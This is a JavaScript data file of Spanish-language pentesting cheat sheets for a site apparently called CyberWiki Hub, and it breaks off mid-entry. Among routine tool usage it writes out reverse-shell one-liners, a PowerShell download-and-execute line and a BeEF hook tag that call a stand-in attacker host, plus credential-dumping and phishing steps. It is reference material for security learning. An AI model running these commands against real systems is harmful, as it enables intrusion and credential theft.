// Cybersecurity cheatsheets - CyberWiki Hub
window.WIKI_DATA_CHEATSHEETS = [
  {
    tool: "Nmap",
    icon: "🔍",
    commands: [
      { cmd: "nmap -sV -sC target", desc: "Detección de servicios + scripts default" },
      { cmd: "nmap -O target", desc: "Fingerprinting del sistema operativo" },
      { cmd: "nmap -p- target", desc: "Escaneo de todos los puertos (1-65535)" },
      { cmd: "nmap -sS -T4 target", desc: "SYN scan rápido (stealth)" },
      { cmd: "nmap -sU target", desc: "Escaneo de puertos UDP" },
      { cmd: "nmap --script vuln target", desc: "Escaneo de vulnerabilidades conocidas" },
      { cmd: "nmap -A -T4 target", desc: "Escaneo agresivo (OS, servicios, scripts, traceroute)" },
      { cmd: "nmap -sn 192.168.1.0/24", desc: "Ping sweep de red completa" },
      { cmd: "nmap --script=http-enum target", desc: "Enumeración de directorios web" },
      { cmd: "nmap -p 80,443 --script=http-shellshock target", desc: "Test vulnerability Shellshock" },
      { cmd: "nmap -sV -oX output.xml target", desc: "Resultados en formato XML" }
    ]
  },
  {
    tool: "Metasploit",
    icon: "💀",
    commands: [
      { cmd: "msfconsole", desc: "Iniciar consola Metasploit" },
      { cmd: "search type:exploit platform:windows", desc: "Buscar exploits para Windows" },
      { cmd: "use exploit/multi/handler", desc: "Seleccionar handler para reverse shell" },
      { cmd: "set PAYLOAD windows/meterpreter/reverse_tcp", desc: "Configurar payload Meterpreter" },
      { cmd: "set LHOST attacker_ip", desc: "Configurar IP del atacante" },
      { cmd: "set RHOSTS target_ip", desc: "Configurar IP de la víctima" },
      { cmd: "exploit -j", desc: "Ejecutar exploit en background" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f exe -o shell.exe", desc: "Generar payload con msfvenom" },
      { cmd: "meterpreter> sysinfo", desc: "Información del sistema remoto" },
      { cmd: "meterpreter> hashdump", desc: "Dump de hashes SAM" },
      { cmd: "meterpreter> screenshot", desc: "Captura de pantalla remota" },
      { cmd: "meterpreter> shell", desc: "Obtener shell del sistema" }
    ]
  },
  {
    tool: "Burp Suite",
    icon: "🕷️",
    commands: [
      { cmd: "burpsuite", desc: "Iniciar Burp Suite" },
      { cmd: "Proxy > Options > Proxy Listeners", desc: "Configurar proxy listener (default: 8080)" },
      { cmd: "Target > Site Map", desc: "Mapa completo de la aplicación web" },
      { cmd: "Spider > Start attack", desc: "Rastrear automáticamente la aplicación" },
      { cmd: "Repeater > Send request", desc: "Reenviar y modificar peticiones HTTP" },
      { cmd: "Intruder > Start attack", desc: "Ataque de fuerza bruta/fuzzing" },
      { cmd: "Decoder > Encode/Decode", desc: "Codificar/decodificar payloads (Base64, URL, etc)" },
      { cmd: "Comparer > Compare responses", desc: "Comparar respuestas HTTP lado a lado" },
      { cmd: "Scanner > Scan target", desc: "Escaneo automatizado de vulnerabilidades" },
      { cmd: "Extender > BApp Store", desc: "Instalar extensiones y plugins adicionales" }
    ]
  },
  {
    tool: "Wireshark",
    icon: "🦈",
    commands: [
      { cmd: "wireshark", desc: "Iniciar interfaz gráfica de Wireshark" },
      { cmd: "tshark -i eth0 -w capture.pcap", desc: "Capturar tráfico en línea de comandos" },
      { cmd: "ip.addr == 192.168.1.1", desc: "Filtrar por dirección IP" },
      { cmd: "tcp.port == 80", desc: "Filtrar por puerto TCP" },
      { cmd: "http.request.method == POST", desc: "Filtrar peticiones HTTP POST" },
      { cmd: "tcp.flags.syn == 1 && tcp.flags.ack == 0", desc: "Filtrar peticiones SYN (nuevas conexiones)" },
      { cmd: "dns", desc: "Filtrar solo tráfico DNS" },
      { cmd: "tls.handshake.type == 1", desc: "Filtrar TLS Client Hello" },
      { cmd: "http contains \"password\"", desc: "Buscar contraseñas en tráfico HTTP" },
      { cmd: "tcp.stream eq 5", desc: "Seguir flujo TCP específico" },
      { cmd: "Statistics > Conversations", desc: "Ver todas las conversaciones de red" },
      { cmd: "Statistics > Protocol Hierarchy", desc: "Jerarquía de protocolos capturados" }
    ]
  },
  {
    tool: "John the Ripper",
    icon: "🔓",
    commands: [
      { cmd: "john --wordlist=rockyou.txt hash.txt", desc: "Fuerza bruta con diccionario" },
      { cmd: "john --show hash.txt", desc: "Mostrar contraseñas crackeadas" },
      { cmd: "john --format=raw-md5 hash.txt", desc: "Especificar formato del hash" },
      { cmd: "john --list=formats", desc: "Listar todos los formatos soportados" },
      { cmd: "john --incremental hash.txt", desc: "Ataque incremental (brute force)" },
      { cmd: "john --single hash.txt", desc: "Ataque single crack (basado en usuario)" },
      { cmd: "unshadow /etc/passwd /etc/shadow > hashes.txt", desc: "Combina archivos passwd y shadow" },
      { cmd: "john --format=zip hash.txt", desc: "Crackear contraseñas de archivos ZIP" },
      { cmd: "john --format=ssh hash.txt", desc: "Crackear claves SSH privadas" },
      { cmd: "john --fork=4 hash.txt", desc: "Usar 4 cores para crackear" }
    ]
  },
  {
    tool: "Hashcat",
    icon: "🔥",
    commands: [
      { cmd: "hashcat -m 0 hash.txt rockyou.txt", desc: "Crackear MD5 con diccionario" },
      { cmd: "hashcat -m 1000 hash.txt rockyou.txt", desc: "Crackear NTLM hashes" },
      { cmd: "hashcat -m 1800 hash.txt rockyou.txt", desc: "Crackear SHA-512 (Unix)" },
      { cmd: "hashcat -a 3 hash.txt ?a?a?a?a", desc: "Brute force 4 caracteres" },
      { cmd: "hashcat --show -m 0 hash.txt", desc: "Mostrar hashes crackeados" },
      { cmd: "hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule", desc: "Usar reglas para transformaciones" },
      { cmd: "hashcat -m 0 hash.txt rockyou.txt -a 1 dict2.txt", desc: "Ataque combinación de diccionarios" },
      { cmd: "hashcat -m 1400 hash.txt example.dict", desc: "Crackear SHA-256" },
      { cmd: "hashcat --benchmark", desc: "Benchmark de hashes por segundo" },
      { cmd: "hashcat -m 0 hash.txt rockyou.txt --potfile-path=custom.pot", desc: "Archivo pot personalizado" },
      { cmd: "hashcat -m 2500 capture.hccapx rockyou.txt", desc: "Crackear hashes WPA/WPA2" }
    ]
  },
  {
    tool: "Gobuster",
    icon: "📁",
    commands: [
      { cmd: "gobuster dir -u http://target -w wordlist.txt", desc: "Enumeración de directorios" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt -x php,html,js", desc: "Agregar extensiones de archivo" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt -t 50", desc: "50 threads para mayor velocidad" },
      { cmd: "gobuster dns -d target.com -w subdomains.txt", desc: "Enumeración de subdominios" },
      { cmd: "gobuster vhost -u http://target -w vhosts.txt", desc: "Enumeración de virtual hosts" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt -s 200,301,302", desc: "Filtrar por códigos de respuesta" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt -b 404", desc: "Excluir código 404" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt -o results.txt", desc: "Guardar resultados en archivo" },
      { cmd: "gobuster dir -u http://target -w wordlist.txt --proxy http://127.0.0.1:8080", desc: "Usar proxy para requests" }
    ]
  },
  {
    tool: "SQLmap",
    icon: "🗄️",
    commands: [
      { cmd: "sqlmap -u \"http://target/?id=1\" --dbs", desc: "Enumerar bases de datos" },
      { cmd: "sqlmap -u \"http://target/?id=1\" -D dbname --tables", desc: "Listar tablas de una DB" },
      { cmd: "sqlmap -u \"http://target/?id=1\" -D dbname -T users --dump", desc: "Volcar datos de tabla" },
      { cmd: "sqlmap -r request.txt --batch", desc: "Automático desde archivo de request" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --os-shell", desc: "Obtener OS shell" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --current-db", desc: "Mostrar DB actual" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --current-user", desc: "Mostrar usuario actual DB" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --passwords", desc: "Crackear hashes de DB" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --technique=BEU", desc: "Especificar técnicas de inyección" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --random-agent", desc: "User-Agent aleatorio" },
      { cmd: "sqlmap -u \"http://target/?id=1\" --level=5 --risk=3", desc: "Máximo nivel de testing" },
      { cmd: "sqlmap --tor --random-agent -u \"http://target/?id=1\"", desc: "A través de Tor" }
    ]
  },
  {
    tool: "Netcat",
    icon: "🌐",
    commands: [
      { cmd: "nc -lvnp 4444", desc: "Escuchar conexiones entrantes en puerto 4444" },
      { cmd: "nc -e /bin/bash attacker_ip 4444", desc: "Reverse shell con Netcat" },
      { cmd: "nc target_ip 80", desc: "Conexión manual a un puerto" },
      { cmd: "nc -zv target_ip 1-1000", desc: "Port scan de puertos 1-1000" },
      { cmd: "nc -lvnp 80 > received_file", desc: "Recibir archivo por Netcat" },
      { cmd: "cat file | nc target_ip 4444", desc: "Enviar archivo por Netcat" },
      { cmd: "nc -u target_ip 53", desc: "Conexión UDP" },
      { cmd: "nc -zv -w2 target_ip 21 22 80 443", desc: "Test rápido de puertos específicos" },
      { cmd: "nc -lvnp 4444 -e cmd.exe", desc: "Reverse shell en Windows" }
    ]
  },
  {
    tool: "Hydra",
    icon: "🐍",
    commands: [
      { cmd: "hydra -l admin -P passwords.txt ssh://target", desc: "Fuerza bruta SSH" },
      { cmd: "hydra -l admin -P passwords.txt ftp://target", desc: "Fuerza bruta FTP" },
      { cmd: "hydra -l admin -P passwords.txt http-post-form \"/login:user=^USER^&pass=^PASS^\"", desc: "Fuerza bruta login HTTP POST" },
      { cmd: "hydra -L users.txt -P passwords.txt target ssh", desc: "Múltiples usuarios y contraseñas" },
      { cmd: "hydra -l admin -P passwords.txt -t 4 ssh://target", desc: "4 threads simultáneos" },
      { cmd: "hydra -l admin -P passwords.txt -vV ssh://target", desc: "Verbose con cada intento" },
      { cmd: "hydra -l admin -P passwords.txt -f ssh://target", desc: "Parar al encontrar primera combinación" },
      { cmd: "hydra -l admin -P passwords.txt -o results.txt ssh://target", desc: "Guardar resultados en archivo" },
      { cmd: "hydra -l admin -P passwords.txt -s 2222 ssh://target", desc: "Especificar puerto alternativo" }
    ]
  },
  {
    tool: "Aircrack-ng",
    icon: "📡",
    commands: [
      { cmd: "airmon-ng start wlan0", desc: "Putar interfaz en modo monitor" },
      { cmd: "airodump-ng wlan0mon", desc: "Escaneo de redes WiFi" },
      { cmd: "airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon", desc: "Capturar tráfico de red específica" },
      { cmd: "aireplay-ng -0 10 -a AP_MAC wlan0mon", desc: "Deauth attack para capturar handshake" },
      { cmd: "aircrack-ng -w wordlist.txt capture.cap", desc: "Crackear handshake WPA" },
      { cmd: "airdecap-ng -e password capture.cap", desc: "Descifrar captura con contraseña" },
      { cmd: "airmon-ng stop wlan0mon", desc: "Volver interfaz a modo normal" },
      { cmd: "aireplay-ng --test wlan0mon", desc: "Test de inyección de paquetes" },
      { cmd: "airodump-ng --manufacturer wlan0mon", desc: "Mostrar fabricante de dispositivos" }
    ]
  },
  {
    tool: "Nikto",
    icon: "🕸️",
    commands: [
      { cmd: "nikto -h http://target", desc: "Escaneo web básico" },
      { cmd: "nikto -h target -p 80,443,8080", desc: "Múltiples puertos" },
      { cmd: "nikto -h target -o report.html -Format html", desc: "Reporte en HTML" },
      { cmd: "nikto -h target -Tuning 12345", desc: "Tests específicos (injection, XSS, etc)" },
      { cmd: "nikto -h target -useproxy http://proxy:8080", desc: "Usar proxy" },
      { cmd: "nikto -h target -ssl", desc: "Forzar escaneo SSL" },
      { cmd: "nikto -h target -C all", desc: "Ejecutar todos los tests CGI" },
      { cmd: "nikto -h target -evasion 1", desc: "Técnicas de evasión IDS" }
    ]
  },
  {
    tool: "Foremost",
    icon: "🔬",
    commands: [
      { cmd: "foremost -i image.dd -o output/", desc: "Recuperar archivos de imagen de disco" },
      { cmd: "foremost -t png,jpg,gif -i image.dd", desc: "Recuperar solo imágenes" },
      { cmd: "foremost -t pdf,doc -i image.dd", desc: "Recuperar documentos" },
      { cmd: "foremost -t zip,rar -i image.dd", desc: "Recuperar archivos comprimidos" },
      { cmd: "foremost -i image.dd -o output/ -v", desc: "Verbose con detalles" },
      { cmd: "foremost -f -i image.dd -o output/", desc: "Sobrescribir archivos existentes" },
      { cmd: "foremost -i disk.img -o results/ -c config.txt", desc: "Usar configuración personalizada" }
    ]
  },
  {
    tool: "Binwalk",
    icon: "📦",
    commands: [
      { cmd: "binwalk firmware.bin", desc: "Analizar contenido de firmware" },
      { cmd: "binwalk -e firmware.bin", desc: "Extraer sistema de archivos" },
      { cmd: "binwalk -M firmware.bin", desc: "Extracción recursiva de sistema de archivos" },
      { cmd: "binwalk -A firmware.bin", desc: "Busqueda de código ejecutable" },
      { cmd: "binwalk -W firmware.bin", desc: "Comparar dos firmware" },
      { cmd: "binwalk --dd='.*' firmware.bin", desc: "Extraer todos los archivos" },
      { cmd: "binwalk -t firmware.bin", desc: "Tipo de archivos encontrados" }
    ]
  },
  {
    tool: "Ghidra",
    icon: "🧪",
    commands: [
      { cmd: "ghidraRun", desc: "Iniciar Ghidra" },
      { cmd: "File > Import File", desc: "Importar binario para análisis" },
      { cmd: "Auto-Analysis", desc: "Análisis automático del binario" },
      { cmd: "Window > Decompile", desc: "Ver código C decompilado" },
      { cmd: "Window > Defined Strings", desc: "Buscar strings en binario" },
      { cmd: "Window > Symbol Tree", desc: "Árbol de funciones y símbolos" },
      { cmd: "Window > Byte Viewer", desc: "Visor de hex bytes" },
      { cmd: "Edit > Export Program", desc: "Exportar análisis" },
      { cmd: "Function > Rename Function", desc: "Renombrar funciones para claridad" }
    ]
  },
  {
    tool: "IDA Pro",
    icon: "🐛",
    commands: [
      { cmd: "ida64 binary", desc: "Abrir binario de 64 bits" },
      { cmd: "Analyze", desc: "Iniciar análisis automático" },
      { cmd: "F5 (Decompile)", desc: "Decompilar función actual" },
      { cmd: "N (Rename)", desc: "Renombrar variable/función" },
      { cmd: "X (Cross-references)", desc: "Ver referencias cruzadas" },
      { cmd: "Strings window (Shift+F12)", desc: "Busqueda de strings" },
      { cmd: "Graph View (Space)", desc: "Vista de grafo de flujo" },
      { cmd: "Segment Viewer", desc: "Ver segmentos del binario" },
      { cmd: "File > Produce file", desc: "Exportar archivo desensamblado" }
    ]
  },
  {
    tool: "Volatility",
    icon: "🧠",
    commands: [
      { cmd: "volatility -f memory.dmp imageinfo", desc: "Identificar perfil del volcado de memoria" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 pslist", desc: "Listar procesos" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 pstree", desc: "Árbol de procesos padre-hijo" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 netscan", desc: "Conexiones de red activas" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 hashdump", desc: "Extraer hashes de memoria" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 filescan", desc: "Buscar archivos en memoria" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q VALUE", desc: "Extraer archivo específico" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 cmdline", desc: "Líneas de comandos ejecutados" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 dlllist", desc: "DLLs cargadas por procesos" },
      { cmd: "volatility -f memory.dmp --profile=Win7SP1x64 hivelist", desc: "Listar registros del sistema" }
    ]
  },
  {
    tool: "Autopsy",
    icon: "🩺",
    commands: [
      { cmd: "autopsy", desc: "Iniciar servidor web de Autopsy" },
      { cmd: "Create New Case", desc: "Crear nuevo caso forense" },
      { cmd: "Add Data Source > Disk Image", desc: "Añadir imagen de disco para análisis" },
      { cmd: "Ingest Modules", desc: "Configurar módulos de análisis" },
      { cmd: "Keyword Search", desc: "Busqueda por palabras clave" },
      { cmd: "Timeline Analysis", desc: "Análisis temporal de eventos" },
      { cmd: "File Analysis", desc: "Navegación de archivos del sistema" },
      { cmd: "Hash Database", desc: "Verificar hashes contra bases conocidas" },
      { cmd: "Generate Report", desc: "Generar reporte final del caso" }
    ]
  },
  {
    tool: "OpenSSL",
    icon: "🔐",
    commands: [
      { cmd: "openssl s_client -connect target:443", desc: "Test conexión SSL/TLS" },
      { cmd: "openssl x509 -in cert.pem -text -noout", desc: "Ver detalles de certificado" },
      { cmd: "openssl genrsa -out key.pem 2048", desc: "Generar clave RSA de 2048 bits" },
      { cmd: "openssl req -new -key key.pem -out cert.csr", desc: "Generar CSR (solicitud de certificado)" },
      { cmd: "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc", desc: "Cifrar archivo con AES-256" },
      { cmd: "openssl enc -d -aes-256-cbc -in file.enc -out file.txt", desc: "Descifrar archivo AES-256" },
      { cmd: "openssl dgst -md5 hash.txt", desc: "Calcular hash MD5" },
      { cmd: "openssl rand -hex 16", desc: "Generar 16 bytes aleatorios en hex" },
      { cmd: "openssl version -a", desc: "Información de versión completa" },
      { cmd: "openssl s_client -connect target:443 -tls1_2", desc: "Forzar conexión TLS 1.2" }
    ]
  },
  {
    tool: "Curl",
    icon: "🔗",
    commands: [
      { cmd: "curl -v http://target", desc: "Request HTTP con verbose" },
      { cmd: "curl -X POST -d 'data' http://target", desc: "POST con datos" },
      { cmd: "curl -H 'Content-Type: application/json' http://target", desc: "Header personalizado" },
      { cmd: "curl -o file http://target/file.zip", desc: "Descargar archivo" },
      { cmd: "curl -k https://self-signed.target", desc: "Ignorar verificación SSL" },
      { cmd: "curl -u user:pass http://target", desc: "Autenticación básica HTTP" },
      { cmd: "curl -L http://target", desc: "Seguir redirecciones" },
      { cmd: "curl -I http://target", desc: "Solo headers HTTP" },
      { cmd: "curl -s -o /dev/null -w '%{http_code}' http://target", desc: "Solo código de respuesta HTTP" },
      { cmd: "curl --proxy http://proxy:8080 http://target", desc: "Request a través de proxy" },
      { cmd: "curl -F 'file=@photo.jpg' http://target/upload", desc: "Subir archivo (multipart)" }
    ]
  },
  {
    tool: "Wget",
    icon: "⬇️",
    commands: [
      { cmd: "wget http://target/file.zip", desc: "Descargar archivo" },
      { cmd: "wget -r http://target/", desc: "Descarga recursiva de sitio web" },
      { cmd: "wget -c http://target/large.iso", desc: "Continuar descarga interrumpida" },
      { cmd: "wget --limit-rate=200k http://target/file", desc: "Limitar velocidad de descarga" },
      { cmd: "wget -q -O file.html http://target", desc: "Guardar con nombre específico, quiet" },
      { cmd: "wget --no-check-certificate https://target", desc: "Ignorar certificados SSL" },
      { cmd: "wget -U 'Mozilla/5.0' http://target", desc: "User-Agent personalizado" },
      { cmd: "wget --mirror -p --convert-links http://target", desc: "Mirror completo del sitio" }
    ]
  },
  {
    tool: "PowerShell",
    icon: "⚡",
    commands: [
      { cmd: "Get-ExecutionPolicy", desc: "Ver política de ejecución actual" },
      { cmd: "Set-ExecutionPolicy Bypass", desc: "Permitir ejecución de scripts" },
      { cmd: "IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')", desc: "Descargar y ejecuar script remotamente" },
      { cmd: "Get-NetTCPConnection", desc: "Ver conexiones TCP activas" },
      { cmd: "Get-Service", desc: "Listar todos los servicios" },
      { cmd: "Get-WmiObject Win32_OperatingSystem", desc: "Información del sistema operativo" },
      { cmd: "Get-Process", desc: "Listar procesos en ejecución" },
      { cmd: "Get-ChildItem -Path C:\\Users -Recurse", desc: "Listar archivos recursivamente" },
      { cmd: "Invoke-Mimikatz", desc: "Ejecutar Mimikatz en memoria" },
      { cmd: "Test-NetConnection target -Port 445", desc: "Test de conexión a puerto específico" },
      { cmd: "whoami /all", desc: "Información completa del usuario actual" },
      { cmd: "net user /domain", desc: "Listar usuarios del dominio" }
    ]
  },
  {
    tool: "Linux Pentesting",
    icon: "🐧",
    commands: [
      { cmd: "find / -perm -4000 2>/dev/null", desc: "Archivos con SUID (privilege escalation)" },
      { cmd: "cat /etc/shadow 2>/dev/null | head -20", desc: "Leer shadow (requiere root)" },
      { cmd: "ss -tlnp", desc: "Puertos abiertos en escucha" },
      { cmd: "ps aux | grep root", desc: "Procesos ejecutados por root" },
      { cmd: "curl -s http://ifconfig.me", desc: "IP pública" },
      { cmd: "echo $PATH", desc: "Variable PATH (buscar vulnerabilidad PATH)" },
      { cmd: "sudo -l", desc: "Permisos sudo del usuario actual" },
      { cmd: "find / -writable -type d 2>/dev/null", desc: "Directorios con permisos de escritura" },
      { cmd: "crontab -l", desc: "Crontab del usuario actual" },
      { cmd: "cat /etc/crontab", desc: "Crontab del sistema" },
      { cmd: "uname -a", desc: "Información completa del kernel" },
      { cmd: "ifconfig -a", desc: "Todas las interfaces de red" },
      { cmd: "ls -la /tmp", desc: "Archivos temporales con permisos" }
    ]
  },
  {
    tool: "Docker Security",
    icon: "🐳",
    commands: [
      { cmd: "docker run -it --rm ubuntu bash", desc: "Contenedor Ubuntu interactivo temporal" },
      { cmd: "docker images", desc: "Listar imágenes descargadas" },
      { cmd: "docker ps -a", desc: "Listar todos los contenedores" },
      { cmd: "docker run -d --name sec-tools kali", desc: "Ejecutar Kali en background" },
      { cmd: "docker exec -it container_id /bin/bash", desc: "Entrar a contenedor existente" },
      { cmd: "docker inspect container_id", desc: "Detalles completos del contenedor" },
      { cmd: "docker logs container_id", desc: "Logs del contenedor" },
      { cmd: "docker network ls", desc: "Redes Docker disponibles" },
      { cmd: "docker run --cap-add=NET_RAW -it ubuntu", desc: "Contenedor con capacidad NET_RAW" },
      { cmd: "docker scan image_name", desc: "Escanear vulnerabilidades en imagen" },
      { cmd: "docker system df", desc: "Espacio utilizado por Docker" }
    ]
  },
  {
    tool: "Enum4linux",
    icon: "📊",
    commands: [
      { cmd: "enum4linux -a target_ip", desc: "Enumeración completa de SMB/Samba" },
      { cmd: "enum4linux -U target_ip", desc: "Listar usuarios SMB" },
      { cmd: "enum4linux -S target_ip", desc: "Listar shares (recursos compartidos)" },
      { cmd: "enum4linux -P target_ip", desc: "Check de políticas de password" },
      { cmd: "enum4linux -G target_ip", desc: "Listar grupos" },
      { cmd: "enum4linux -l -u user -p pass target_ip", desc: "Enumeración con credenciales" }
    ]
  },
  {
    tool: "SMBClient",
    icon: "🗂️",
    commands: [
      { cmd: "smbclient -L //target_ip -N", desc: "Listar shares anónimamente" },
      { cmd: "smbclient //target_ip/share -N", desc: "Conectar a share sin contraseña" },
      { cmd: "smbclient //target_ip/share -U user", desc: "Conectar con usuario específico" },
      { cmd: "smbclient -c 'ls' //target_ip/share", desc: "Listar archivos en share" },
      { cmd: "smbclient -c 'get file.txt' //target_ip/share", desc: "Descargar archivo del share" },
      { cmd: "smbclient -c 'put file.txt' //target_ip/share", desc: "Subir archivo al share" }
    ]
  },
  {
    tool: "Responder",
    icon: "📡",
    commands: [
      { cmd: "responder -I eth0", desc: "Iniciar Responder para capturar hashes" },
      { cmd: "responder -I eth0 -wrf", desc: "Modo agresivo (WPAD, FTP, RRor)" },
      { cmd: "responder -I eth0 --lm", desc: "Forzar autenticación LM (más crackeable)" },
      { cmd: "responder -I eth0 -f", desc: "Responder en modo flood" },
      { cmd: "cat /usr/share/responder/Responder.conf", desc: "Configurar servicios activos" }
    ]
  },
  {
    tool: "WPScan",
    icon: "📰",
    commands: [
      { cmd: "wpscan --url http://target", desc: "Escaneo básico de WordPress" },
      { cmd: "wpscan --url http://target --enumerate u", desc: "Enumerar usuarios" },
      { cmd: "wpscan --url http://target --enumerate ap", desc: "Enumerar plugins activos" },
      { cmd: "wpscan --url http://target --enumerate at", desc: "Enumerar temas activos" },
      { cmd: "wpscan --url http://target --wordlist rockyou.txt", desc: "Fuerza bruta de usuarios" },
      { cmd: "wpscan --url http://target --api-token TOKEN", desc: "API premium para vulnerabilidades" },
      { cmd: "wpscan --url http://target -e vp", desc: "Plugins vulnerables" },
      { cmd: "wpscan --url http://target --proxy http://proxy:8080", desc: "Usar proxy" }
    ]
  },
  {
    tool: "Joomscan",
    icon: "🔧",
    commands: [
      { cmd: "joomscan -u http://target", desc: "Escaneo básico de Joomla" },
      { cmd: "joomscan -u http://target --ec", desc: "Enumerar componentes" },
      { cmd: "joomscan -u http://target --eu", desc: "Enumerar usuarios" },
      { cmd: "joomscan -u http://target --enumerate-all", desc: "Enumeración completa" },
      { cmd: "joomscan -u http://target -o report.txt", desc: "Guardar en reporte" }
    ]
  },
  {
    tool: "DrupalScanner",
    icon: "🏺",
    commands: [
      { cmd: "droopescan scan drupal -u http://target", desc: "Escaneo básico de Drupal" },
      { cmd: "droopescan scan drupal -u http://target -t 20", desc: "20 threads" },
      { cmd: "droopescan scan drupal -u http://target --verbose", desc: "Modo verbose" }
    ]
  },
  {
    tool: "Feroxbuster",
    icon: "🦊",
    commands: [
      { cmd: "feroxbuster -u http://target", desc: "Fuzzing de directorios" },
      { cmd: "feroxbuster -u http://target -w wordlist.txt", desc: "Wordlist personalizada" },
      { cmd: "feroxbuster -u http://target -x php,html,txt", desc: "Extensiones específicas" },
      { cmd: "feroxbuster -u http://target --threads 50", desc: "50 hilos de ejecución" },
      { cmd: "feroxbuster -u http://target -o results.json", desc: "Resultados en JSON" },
      { cmd: "feroxbuster -u http://target --recursive", desc: "Fuzzing recursivo" }
    ]
  },
  {
    tool: "CrackMapExec",
    icon: "🗺️",
    commands: [
      { cmd: "crackmapexec smb target_ip", desc: "Enumeración básica SMB" },
      { cmd: "crackmapexec smb target_ip -u user -p pass", desc: "Autenticación SMB" },
      { cmd: "crackmapexec smb target_ip -u user -p pass --shares", desc: "Listar shares" },
      { cmd: "crackmapexec smb target_ip -u user -p pass -M mimikatz", desc: "Módulo Mimikatz" },
      { cmd: "crackmapexec ssh target_ip -u root -p pass", desc: "Test credenciales SSH" },
      { cmd: "crackmapexec winrm target_ip -u user -p pass", desc: "Test credenciales WinRM" },
      { cmd: "crackmapexec smb 192.168.1.0/24 -u user -p pass --gen-relay-list relay.txt", desc: "Generar lista para relay" }
    ]
  },
  {
    tool: "BloodHound",
    icon: "🩸",
    commands: [
      { cmd: "bloodhound-python -u user -p pass -d domain -c All", desc: "Colectar datos de AD remotamente" },
      { cmd: "bloodhound-python -u user -p pass -d domain -c Group,LocalAdmin", desc: "Colectar datos específicos" },
      { cmd: "sharpHound -c All", desc: "Colectar desde dominio (ejecutable Windows)" },
      { cmd: "sharpHound -c DCOnly", desc: "Solo colectar desde DC" },
      { cmd: "neo4j console start", desc: "Iniciar base de datos Neo4j para BloodHound" }
    ]
  },
  {
    tool: "Rubeus",
    icon: "🎯",
    commands: [
      { cmd: "Rubeus.exe kerberoast", desc: "Obtener TGTs de usuarios SPN" },
      { cmd: "Rubeus.exe asreproast", desc: "AS-REP Roasting (cuentas sin preauth)" },
      { cmd: "Rubeus.exe asktgt /user:admin /password:pass", desc: "Solicitar TGT con credenciales" },
      { cmd: "Rubeus.exe dump /nowrap", desc: "Dumps tickets de Kerberos" },
      { cmd: "Rubeus.exe golden ticket", desc: "Golden ticket attack" },
      { cmd: "Rubeus.exe sgt /ticket:base64", desc: "Silver ticket attack" }
    ]
  },
  {
    tool: "Mimikatz",
    icon: "🔑",
    commands: [
      { cmd: "mimikatz # privilege::debug", desc: "Obtener privilegios de debug" },
      { cmd: "mimikatz # sekurlsa::logonpasswords", desc: "Extraer credenciales en memoria" },
      { cmd: "mimikatz # lsadump::sam", desc: "Dumps hashes SAM" },
      { cmd: "mimikatz # lsadump::dcsync", desc: "Sync desde DC (DCSync attack)" },
      { cmd: "mimikatz # kerberos::golden", desc: "Crear Golden Ticket" },
      { cmd: "mimikatz # lsadump::lsa /patch", desc: "Dump LSA Secrets" }
    ]
  },
  {
    tool: "Impacket",
    icon: "🧰",
    commands: [
      { cmd: "impacket-smbexec user:pass@target", desc: "Ejecución remota vía SMB" },
      { cmd: "impacket-psexec user:pass@target", desc: "Ejecución remota vía PsExec" },
      { cmd: "impacket-wmiexec user:pass@target", desc: "Ejecución remota vía WMI" },
      { cmd: "impacket-secretsdump user:pass@target", desc: "Dump de secrets remotos" },
      { cmd: "impacket-GetUserSPNs domain/user:pass -request", desc: "Kerberoasting" },
      { cmd: "impacket-ntlmrelayx -t target", desc: "NTLM Relay attack" },
      { cmd: "impacket-smbclient domain/user:pass@target", desc: "Cliente SMB interactivo" },
      { cmd: "impacket-ticketer", desc: "Crear tickets Kerberos" }
    ]
  },
  {
    tool: "Setoolkit",
    icon: "🎭",
    commands: [
      { cmd: "setoolkit", desc: "Iniciar Social Engineering Toolkit" },
      { cmd: "Social-Engineering Attacks", desc: "Menú de ataques de ingeniería social" },
      { cmd: "Website Attack Vectors", desc: "Vectores de ataque web" },
      { cmd: "Credential Harvester Attack", desc: "Ataque de cosecha de credenciales" },
      { cmd: "Tabnabbing", desc: "Ataque de tabnabbing" }
    ]
  },
  {
    tool: "BeEF",
    icon: "🐄",
    commands: [
      { cmd: "beef-xss", desc: "Iniciar BeEF Framework" },
      { cmd: "http://attacker:3000/ui/panel", desc: "Panel de control BeEF" },
      { cmd: "Hook URL: <script src='http://attacker:3000/hook.js'></script>", desc: "Inyectar hook en target" },
      { cmd: "BeEF > Commands > Browser", desc: "Módulos de ataque al navegador" },
      { cmd: "BeEF > Commands > Network", desc: "Módulos de red interna" }
    ]
  },
  {
    tool: "SocialFish",
    icon: "🐟",
    commands: [
      { cmd: "python3 SocialFish.py", desc: "Iniciar SocialFish" },
      { cmd: "Seleccionar plataforma de phishing", desc: "Elegir sitio a clonar" },
      { cmd: "Iniciar servidor de phishing", desc: "Servidor local para capturar creds" },
      { cmd: "Ver credenciales capturadas", desc: "Panel de resultados" }
    ]
  },
  {
    tool: "PhishingFrenzy",
    icon: "📧",
    commands: [
      { cmd: "phishing-frenzy", desc: "Iniciar Phishing Frenzy" },
      { cmd: "Configurar campaña de phishing", desc: "Crear nueva campaña" },
      { cmd: "Importar lista de correos", desc: "Cargar targets" },
